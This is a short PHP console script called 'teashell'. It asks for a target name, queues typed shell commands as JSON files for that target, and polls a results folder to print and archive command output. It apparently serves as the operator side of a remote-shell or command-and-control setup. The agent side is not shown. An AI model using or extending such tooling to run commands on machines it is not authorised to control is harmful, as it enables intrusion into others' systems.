<?php

require __DIR__."/bootstrap/init.php";

printf("Enter your target: ");
$target = trim(fgets(STDIN, 64));

$i = 1000;
while (true):
	printf("[teashell@{$target}] > ");
	$in = trim(fgets(STDIN, 4096));
	file_put_contents(STORAGE_PATH."/queue/shell_cmd/{$target}___{$i}", json_encode(
		[
			"due" => 0,
			"cmd" => $in
		], JSON_UNESCAPED_SLASHES
	));

	while (true):
		$b = false;
		foreach(glob(STORAGE_PATH."/queue/shell_cmd/result/{$target}__*") as $f):
			$h = fopen($f, "r");
			flock($h, LOCK_EX);
			while (!feof($h)) {
				if (fread($h, 1) === "\n") break;
			}
			while (!feof($h)) {
				print fread($h, 2048);	
			}
			fclose($h);
			$basename = basename($f);
			rename($f, STORAGE_PATH."/queue/shell_cmd/result/archived/{$basename}");
			$b = true;
		endforeach;
		if ($b) {
			break;
		} else {
			usleep(500000);
		}
	endwhile;

endwhile;